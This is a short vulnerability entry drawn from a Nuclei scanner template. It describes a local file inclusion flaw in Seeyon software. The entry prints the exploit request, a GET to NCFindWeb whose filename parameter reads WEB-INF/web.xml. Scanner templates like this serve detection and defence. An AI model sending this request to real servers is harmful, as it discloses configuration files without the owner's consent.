# Vulnerability: Seeyon WooYun - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`wooyun-2015-148227.yaml`)

## Description
Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to the attacker via local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
```
